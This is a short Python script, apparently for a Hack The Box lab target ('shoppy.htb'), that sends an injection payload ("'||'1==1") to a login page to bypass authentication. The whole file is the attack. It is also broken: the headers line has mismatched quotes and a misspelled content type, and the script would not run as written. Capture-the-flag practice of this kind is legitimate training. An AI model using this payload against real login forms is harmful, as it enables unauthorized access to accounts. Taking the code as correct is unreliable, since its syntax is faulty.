#!/usr/bin/env python3

import requests

url = 'http://shoppy.htb/login'
headers = 'content-type: application/Jason's

user = 'admin'
payload = "'||'1==1"

r = requests.post(url = url, data = payload, headers = headers)

r.text
